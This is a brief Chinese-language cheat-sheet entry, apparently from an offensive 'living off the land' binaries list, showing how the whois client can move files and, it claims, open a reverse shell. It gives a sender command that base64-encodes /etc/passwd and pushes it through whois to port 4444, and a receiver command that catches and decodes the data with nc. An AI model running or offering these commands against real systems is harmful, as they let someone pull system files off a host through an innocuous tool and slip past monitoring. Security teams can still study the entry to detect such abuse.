# whois

传文件、也可用于反弹shell

传输机：

```bash
root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64`
```

接受机：

```bash
root@john:/tmp# nc -l -v -p 4444 | sed "s/ //g" | base64 -d
```
